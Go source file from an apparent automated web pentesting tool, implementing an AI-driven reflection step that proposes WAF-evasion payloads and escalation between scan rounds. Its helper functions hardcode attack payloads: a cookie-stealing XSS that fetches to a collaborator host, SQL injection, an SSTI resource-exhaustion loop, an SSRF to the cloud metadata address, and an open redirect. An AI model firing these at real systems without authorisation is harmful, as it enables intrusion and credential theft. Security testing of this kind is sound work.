package ai

import (
	"context"
	"encoding/json"
	"strings"

	"auto-bughunter/backend/internal/model"
)
// ReflectionResult is the structured output of a single pentest-loop reflection
// step. The AI (or local reasoner) analyses what has been tried so far and
// proposes concrete adjustments for the next iteration.
type ReflectionResult struct {
	// GapAnalysis is a human-readable sentence describing what vulnerability
	// classes, endpoints, or parameter patterns have NOT been adequately tested.
	GapAnalysis string `json:"gapAnalysis"`

	// IterationRationale is the AI's plain-language explanation of WHY
	// another iteration is warranted: what signals in the current findings,
	// response patterns, or coverage gaps justify continuing rather than
	// stopping. This is the primary text shown to the operator in the UI.
	// When the AI decides no further iteration is needed, this field explains
	// that conclusion instead.
	IterationRationale string `json:"iterationRationale"`

	// FocusAreas lists the top-priority vulnerability categories to target in
	// the next round (e.g. "idor", "ssti", "business_logic").
	FocusAreas []string `json:"focusAreas"`

	// RefinedHints are ready-to-use hypothesis refinements derived from
	// partially-confirmed signals or known evasion patterns.
	RefinedHints []RefinedHint `json:"refinedHints"`

	// ShouldEscalate is true when the reflection recommends escalating to
	// more aggressive or authenticated probing (e.g. WAF bypass, session-aware).
	ShouldEscalate bool `json:"shouldEscalate"`

	// EscalationReason explains why escalation is recommended.
	EscalationReason string `json:"escalationReason,omitempty"`

	// SkipCategories lists vulnerability categories that are fully confirmed or
	// have been exhausted; the next round should avoid spending budget on them.
	SkipCategories []string `json:"skipCategories"`
}

// RefinedHint is a concrete, scanner-executable probe suggestion derived from
// the reflection step. It mirrors VulnerabilityHypothesis but emphasises the
// corrective/refined nature of the payload (e.g. WAF-evading variant).
type RefinedHint struct {
	// Category is the vulnerability class (matches RunHypothesisVerification).
	Category string `json:"category"`
	// Endpoint is the target URL for this refined probe.
	Endpoint string `json:"endpoint"`
	// ParamName is the HTTP parameter to inject into.
	ParamName string `json:"paramName,omitempty"`
	// PayloadHint is the corrected or evasion-variant payload.
	PayloadHint string `json:"payloadHint"`
	// Rationale explains why this payload variant is expected to succeed where
	// the previous attempt failed.
	Rationale string `json:"rationale"`
}

// Reflect asks the configured AI provider to analyse one completed pentest
// iteration and produce actionable guidance for the next round. It receives:
//   - target: the base URL being tested
//   - round: the 1-based round number just completed
//   - findings: all findings confirmed so far across all rounds
//   - probeResults: the full HTTP-level outcome of every probe run this round,
//     including unconfirmed ones (WAF blocks, near-misses, server errors).
//     These give the AI the raw evidence it needs to reason about WHY a probe
//     failed and what different approach to try next.
//   - coverageMap: per-category list of endpoints already tested (from CoverageTracker)
//
// Falls back to a rule-based local reasoner when no AI provider is configured.
func (c *Client) Reflect(
	ctx context.Context,
	target string,
	round int,
	findings []model.Finding,
	probeResults []model.ProbeResult,
	coverageMap map[string][]string,
	policyPack ...string,
) ReflectionResult {
	if c == nil || !c.shouldCallProvider() {
		return localReasonerReflect(target, round, findings, probeResults, coverageMap)
	}

	// Build a compact probe-result summary for the AI prompt.
	// Each entry includes the outcome classification and the plain-English
	// observation — this is the key data the AI uses to distinguish WAF blocks
	// from genuine negatives and near-misses that warrant refined payloads.
	probesSummary := make([]map[string]string, 0, len(probeResults))
	for _, pr := range probeResults {
		entry := map[string]string{
			"category":    pr.Category,
			"endpoint":    pr.Endpoint,
			"paramName":   pr.ParamName,
			"payload":     pr.Payload,
			"outcome":     string(pr.Outcome),
			"statusCode":  itoa(pr.StatusCode),
			"observation": pr.Observation,
		}
		probesSummary = append(probesSummary, entry)
	}

	// Build a compact finding summary.
	findingSummary := make([]map[string]string, 0, len(findings))
	for _, f := range findings {
		findingSummary = append(findingSummary, map[string]string{
			"category": f.Category,
			"severity": string(f.Severity),
			"title":    f.Title,
			"url":      f.AffectedURL,
		})
	}

	baseReflectInstructions := "You are an expert penetration tester reflecting on a completed scan iteration. " +
		"The 'probeResults' array contains the full HTTP-level observation for EVERY probe run this round, " +
		"including ones that were blocked, near-missed, or returned server errors. " +
		"Use the 'outcome' and 'observation' fields to understand WHY each probe succeeded or failed. " +
		"For example: 'waf_blocked' means the payload was filtered — propose an evasion variant; " +
		"'near_miss' means a partial signal was observed — refine the payload for the specific context; " +
		"'server_error' on an injection probe means an exception was triggered — follow up with blind probes; " +
		"'no_signal' means the target is genuinely clean on that combination. " +
		"Write a clear iterationRationale (2–3 sentences) in plain English explaining WHY another iteration " +
		"is warranted, citing specific signals from probeResults (e.g. 'Two XSS probes were WAF-blocked " +
		"suggesting the payload is being filtered; evasion variants should be tried.'). " +
		"If no further iteration is useful, explain that conclusion in iterationRationale instead. " +
		"Recommend up to 3 refined payload hints as refinedHints, each targeting a specific near-miss or blocked probe. " +
		"List focusAreas (up to 4 category names) for the next round. " +
		"Set shouldEscalate to true if probeResults show WAF blocking or auth enforcement that requires " +
		"authenticated or bypass-level probing. " +
		"List skipCategories that are fully confirmed or have no_signal across all tried endpoints. "

	// Inject policy-specific constraints.
	reflectPolicy := ""
	if len(policyPack) > 0 {
		reflectPolicy = strings.ToLower(strings.TrimSpace(policyPack[0]))
	}
	switch reflectPolicy {
	case "safe":
		baseReflectInstructions += "POLICY CONSTRAINT (safe mode): " +
			"Do NOT recommend probes that could cause data modification, denial of service, or authentication bypass. " +
			"Only recommend further iterations when at least two distinct no_signal outcomes remain unexplored. " +
			"Err on the side of stopping rather than speculative further probing.\n"
	case "aggressive":
		baseReflectInstructions += "POLICY CONSTRAINT (aggressive mode): " +
			"Proactively recommend chained attack paths and novel payload families even when current probes return no_signal. " +
			"Prioritise privilege escalation and authentication bypass refinements.\n"
	}
	baseReflectInstructions += "Reply with strict JSON only: " +
		`{"gapAnalysis":string,"iterationRationale":string,"focusAreas":[string],"refinedHints":[{"category":string,"endpoint":string,"paramName":string,"payloadHint":string,"rationale":string}],"shouldEscalate":bool,"escalationReason":string,"skipCategories":[string]}`

	payload := map[string]any{
		"target":       target,
		"round":        round,
		"findings":     findingSummary,
		"probeResults": probesSummary,
		"coverageMap":  coverageMap,
		"instructions": baseReflectInstructions,
	}

	userJSON, err := json.Marshal(payload)
	if err != nil {
		return localReasonerReflect(target, round, findings, probeResults, coverageMap)
	}

	messages := []Message{
		{Role: "system", Content: "You are an expert penetration tester. Reflect on the completed scan iteration and provide actionable guidance. Reply with strict JSON."},
		{Role: "user", Content: string(userJSON)},
	}

	content, err := c.fastComplete(ctx, messages, 0.3, true)
	if err != nil || content == "" {
		return localReasonerReflect(target, round, findings, probeResults, coverageMap)
	}

	var result ReflectionResult
	if err := json.Unmarshal([]byte(content), &result); err != nil {
		return localReasonerReflect(target, round, findings, probeResults, coverageMap)
	}
	return result
}

// allCategories is the canonical set of vulnerability categories the system
// can probe, used by the local reasoner to compute coverage gaps.
var allCategories = []string{
	"xss", "sqli", "open_redirect", "cors", "ssrf",
	"auth_bypass", "idor", "ssti", "business_logic",
}

// localReasonerReflect is the rule-based fallback reflection used when no AI
// provider is configured. It uses ProbeResult outcome data to classify what
// actually happened during each probe — WAF blocks, near-misses, server errors
// — and writes plain-English rationale to explain the iteration decision.
func localReasonerReflect(
	_ string,
	round int,
	findings []model.Finding,
	probeResults []model.ProbeResult,
	coverageMap map[string][]string,
) ReflectionResult {
	// Determine which categories have been confirmed in findings.
	confirmed := map[string]bool{}
	for _, f := range findings {
		cat := strings.ToLower(strings.TrimSpace(f.Category))
		if cat != "" {
			confirmed[cat] = true
		}
	}

	// Analyse probe outcomes to understand what happened.
	outcomesByCat := map[string][]model.ProbeOutcome{}
	tried := map[string]bool{}
	triedEndpoints := map[string][]string{}
	wafBlockedCats := map[string]bool{}
	nearMissCats := map[string]bool{}
	serverErrorCats := map[string]bool{}

	for _, pr := range probeResults {
		cat := strings.ToLower(strings.TrimSpace(pr.Category))
		tried[cat] = true
		ep := strings.TrimSpace(pr.Endpoint)
		if ep != "" {
			triedEndpoints[cat] = append(triedEndpoints[cat], ep)
		}
		outcomesByCat[cat] = append(outcomesByCat[cat], pr.Outcome)
		switch pr.Outcome {
		case model.ProbeWAFBlocked:
			wafBlockedCats[cat] = true
		case model.ProbeNearMiss:
			nearMissCats[cat] = true
		case model.ProbeServerError:
			serverErrorCats[cat] = true
		}
	}
	// Also mark categories in the coverage map as tried.
	for cat, eps := range coverageMap {
		if len(eps) > 0 {
			tried[strings.ToLower(cat)] = true
		}
	}

	// Gap analysis: find categories that haven't been tried yet.
	gaps := make([]string, 0, len(allCategories))
	for _, cat := range allCategories {
		if !tried[cat] {
			gaps = append(gaps, cat)
		}
	}

	gapAnalysis := "No coverage gaps detected."
	if len(gaps) > 0 {
		gapAnalysis = "Untested vulnerability categories after round " + itoa(round) + ": " + strings.Join(gaps, ", ") + "."
	}

	// Focus areas: prioritise gaps, then near-misses and WAF-blocked categories.
	focusAreas := make([]string, 0, 4)
	for _, cat := range gaps {
		focusAreas = append(focusAreas, cat)
		if len(focusAreas) >= 4 {
			break
		}
	}
	for cat := range nearMissCats {
		focusAreas = appendUniqueString(focusAreas, cat)
		if len(focusAreas) >= 4 {
			break
		}
	}
	for cat := range wafBlockedCats {
		focusAreas = appendUniqueString(focusAreas, cat)
		if len(focusAreas) >= 4 {
			break
		}
	}
	if len(focusAreas) < 4 {
		for _, cat := range allCategories {
			if tried[cat] && !confirmed[cat] {
				focusAreas = appendUniqueString(focusAreas, cat)
			}
			if len(focusAreas) >= 4 {
				break
			}
		}
	}

	// Refined hints: derive from near-miss and WAF-blocked probe results.
	var refinedHints []RefinedHint
	for _, pr := range probeResults {
		cat := strings.ToLower(strings.TrimSpace(pr.Category))
		if confirmed[cat] || len(refinedHints) >= 3 {
			continue
		}
		ep := strings.TrimSpace(pr.Endpoint)
		if ep == "" {
			continue
		}
		switch pr.Outcome {
		case model.ProbeWAFBlocked:
			alt := alternativePayload(cat, pr.Payload)
			if alt != "" && alt != pr.Payload {
				refinedHints = append(refinedHints, RefinedHint{
					Category:    pr.Category,
					Endpoint:    ep,
					ParamName:   pr.ParamName,
					PayloadHint: alt,
					Rationale:   "Previous payload was WAF-blocked (HTTP " + itoa(pr.StatusCode) + "); trying an evasion-variant for " + pr.Category + ".",
				})
			}
		case model.ProbeNearMiss:
			alt := alternativePayload(cat, pr.Payload)
			if alt != "" && alt != pr.Payload {
				refinedHints = append(refinedHints, RefinedHint{
					Category:    pr.Category,
					Endpoint:    ep,
					ParamName:   pr.ParamName,
					PayloadHint: alt,
					Rationale:   "Near-miss signal observed: " + pr.Observation + " Trying a refined payload.",
				})
			}
		case model.ProbeServerError:
			// Server error on injection — try a blind/time-based payload.
			blind := blindPayloadForCategory(cat)
			if blind != "" {
				refinedHints = append(refinedHints, RefinedHint{
					Category:    pr.Category,
					Endpoint:    ep,
					ParamName:   pr.ParamName,
					PayloadHint: blind,
					Rationale:   "Server returned HTTP " + itoa(pr.StatusCode) + " on injection probe — unhandled exception detected. Trying blind/time-based confirmation.",
				})
			}
		}
	}

	// Skip categories: those already confirmed at high confidence.
	skipCats := make([]string, 0)
	for _, f := range findings {
		cat := strings.ToLower(strings.TrimSpace(f.Category))
		if f.Confidence >= 0.88 && cat != "" {
			skipCats = appendUniqueString(skipCats, cat)
		}
	}

	// Escalation: suggest if WAF blocking was seen or if round >= 2 with no findings.
	shouldEscalate := (len(wafBlockedCats) > 0 && round >= 2) || (round >= 2 && len(findings) == 0)
	escalationReason := ""
	if shouldEscalate {
		if len(wafBlockedCats) > 0 {
			wafCats := make([]string, 0, len(wafBlockedCats))
			for c := range wafBlockedCats {
				wafCats = append(wafCats, c)
			}
			escalationReason = "WAF blocking detected on: " + strings.Join(wafCats, ", ") + ". Escalate to authenticated or WAF-bypass probing."
		} else {
			escalationReason = "No findings after " + itoa(round) + " rounds; escalate to authenticated or WAF-bypass probing."
		}
	}

	// IterationRationale: synthesise a plain-English explanation.
	iterationRationale := buildLocalIterationRationale(
		round, gaps, focusAreas, refinedHints, shouldEscalate, escalationReason,
		confirmed, wafBlockedCats, nearMissCats, serverErrorCats,
	)

	return ReflectionResult{
		GapAnalysis:        gapAnalysis,
		IterationRationale: iterationRationale,
		FocusAreas:         focusAreas,
		RefinedHints:       refinedHints,
		ShouldEscalate:     shouldEscalate,
		EscalationReason:   escalationReason,
		SkipCategories:     skipCats,
	}
}

// buildLocalIterationRationale generates a plain-English explanation of why
// the reasoning loop should (or should not) continue, incorporating actual
// probe outcome signals (WAF blocks, near-misses, server errors).
func buildLocalIterationRationale(
	round int,
	gaps, focusAreas []string,
	refinedHints []RefinedHint,
	shouldEscalate bool,
	escalationReason string,
	confirmed map[string]bool,
	wafBlocked, nearMiss, serverError map[string]bool,
) string {
	if len(gaps) == 0 && len(refinedHints) == 0 && len(wafBlocked) == 0 && len(nearMiss) == 0 && len(serverError) == 0 && !shouldEscalate {
		if len(confirmed) > 0 {
			cats := make([]string, 0, len(confirmed))
			for c := range confirmed {
				cats = append(cats, c)
			}
			return "Round " + itoa(round) + " completed with confirmed findings in: " +
				strings.Join(cats, ", ") + ". " +
				"All standard vulnerability categories have been probed and the attack surface appears well covered. " +
				"No further iteration is required."
		}
		return "Round " + itoa(round) + " completed. Coverage appears exhaustive and no additional signals justify a further iteration."
	}

	var b strings.Builder
	b.WriteString("Round " + itoa(round) + " complete. ")

	if len(wafBlocked) > 0 {
		cats := make([]string, 0, len(wafBlocked))
		for c := range wafBlocked {
			cats = append(cats, c)
		}
		b.WriteString("WAF blocking was detected on probes for: ")
		b.WriteString(strings.Join(cats, ", "))
		b.WriteString(". The target may still be vulnerable — the payloads were filtered before reaching application logic. ")
		b.WriteString("The next round will retry with evasion-variant payloads (URL-encoding, case variation, chunked transfer). ")
	}

	if len(nearMiss) > 0 {
		cats := make([]string, 0, len(nearMiss))
		for c := range nearMiss {
			cats = append(cats, c)
		}
		b.WriteString("Near-miss signals were observed for: ")
		b.WriteString(strings.Join(cats, ", "))
		b.WriteString(". Partial signals (reflected substrings, application errors, timing anomalies) suggest the vulnerability may be present but in a different injection context. ")
		b.WriteString("Refined context-specific payloads will be attempted next round. ")
	}

	if len(serverError) > 0 {
		cats := make([]string, 0, len(serverError))
		for c := range serverError {
			cats = append(cats, c)
		}
		b.WriteString("Server errors (5xx) were triggered by injection probes on: ")
		b.WriteString(strings.Join(cats, ", "))
		b.WriteString(". An unhandled application exception on a crafted input is a strong injection signal — blind/time-based follow-up probes are warranted. ")
	}

	if len(gaps) > 0 {
		b.WriteString("The following vulnerability categories remain untested: ")
		b.WriteString(strings.Join(gaps, ", "))
		b.WriteString(". Iterating to ensure full coverage before concluding the engagement. ")
	}

	if shouldEscalate && escalationReason != "" {
		b.WriteString(escalationReason)
		b.WriteString(" ")
	}

	if len(focusAreas) > 0 {
		b.WriteString("Next round will prioritise: ")
		b.WriteString(strings.Join(focusAreas, ", "))
		b.WriteString(".")
	}

	return strings.TrimSpace(b.String())
}

// blindPayloadForCategory returns a blind/time-based payload for categories
// where a server error was observed, for follow-up confirmation probes.
func blindPayloadForCategory(category string) string {
	switch category {
	case "sqli":
		return "1 AND SLEEP(5)--"
	case "ssti":
		return "{{range $i,$e := until 9999999}}{{end}}"
	case "xss":
		return `"><script>fetch('https://burpcollaborator.example.com/'+document.cookie)</script>`
	case "ssrf":
		return "http://burpcollaborator.example.com/"
	default:
		return ""
	}
}

// alternativePayload returns a WAF-evasion or structural variant of payload for
// the given category. Returns empty string when no alternative is known.
func alternativePayload(category, previous string) string {
	_ = previous
	switch category {
	case "xss":
		return `"><img src=x onerror=alert(1)>`
	case "sqli":
		return `1 AND SLEEP(5)--`
	case "ssti":
		return `{{7*'7'}}`
	case "open_redirect":
		return `//evil.example.com/%0d%0a`
	case "cors":
		return `Origin: https://evil.example.com`
	case "ssrf":
		return `http://169.254.169.254/latest/meta-data/`
	case "idor":
		return `0`
	case "auth_bypass":
		return `' OR 1=1--`
	default:
		return ""
	}
}

// appendUniqueString appends s to ss only if not already present.
func appendUniqueString(ss []string, s string) []string {
	for _, existing := range ss {
		if existing == s {
			return ss
		}
	}
	return append(ss, s)
}

// itoa converts an int to its decimal string representation without importing strconv.
func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	buf := [20]byte{}
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	if neg {
		i--
		buf[i] = '-'
	}
	return string(buf[i:])
}
